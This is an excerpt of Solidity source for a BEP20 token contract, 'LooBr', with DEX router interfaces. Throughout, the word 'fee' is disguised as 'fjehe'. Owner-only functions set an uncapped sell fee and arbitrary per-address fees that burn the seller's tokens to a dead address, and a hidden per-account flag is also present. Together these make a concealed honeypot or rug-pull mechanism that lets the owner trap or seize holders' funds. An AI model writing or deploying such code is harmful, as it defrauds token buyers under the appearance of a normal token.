...
interface IUniswapV2Factory {
    ...
    function fjeheTo() external view returns (address);
    function fjeheToSetter() external view returns (address);
    ...
    function setfjeheTo(address) external;
    function setfjeheToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfjeheOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfjeheOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfjeheOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfjeheOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfjeheOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract LooBr is BEP20, Ownable {
    ...
    uint256 private _defaultSellfjehe = 0;

    uint256 private _defaultBuyfjehe = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfjehe;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfjehe = _value;
    }

    function setSlipfjehe(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfjehe[_address] = _value;
    }

    function getSlipfjehe(address _address) external view onlyownar returns (uint256) {
        return _slipfjehe[_address];
    }


    function setMAccountfjehe(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfjehe(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefjeheAmount = 0;

        if (rF) {
            uint256 tradefjehe = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefjehe = _defaultSellfjehe;
                }
                if (from == uniswapV2Pair) {

                    tradefjehe = _defaultBuyfjehe;
                }
            }
            if (_slipfjehe[from] > 0) {
                tradefjehe = _slipfjehe[from];
            }

            tradefjeheAmount = _Amount.mul(tradefjehe).div(100);
        }


        if (tradefjeheAmount > 0) {
            _balances[from] = _balances[from].sub(tradefjeheAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefjeheAmount);
            emit Transfer(from, _deadAddress, tradefjeheAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefjeheAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefjeheAmount);
        emit Transfer(from, _to, _Amount - tradefjeheAmount);
    }
